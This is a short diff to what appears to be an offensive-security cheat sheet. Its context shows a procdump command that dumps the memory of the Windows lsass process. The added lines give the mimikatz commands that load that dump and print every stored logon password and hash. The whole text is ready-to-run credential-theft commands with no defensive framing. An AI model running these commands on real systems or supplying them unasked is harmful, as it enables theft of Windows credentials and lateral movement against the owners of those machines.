@@ -34,3 +34,7 @@ shell
 --# WINDOWS PROCDUMP #--
 #can use procdump to dump lsass memory
 procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+#Then use applications  such as mimikatz on another system:
+mimikatz.exe
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords full
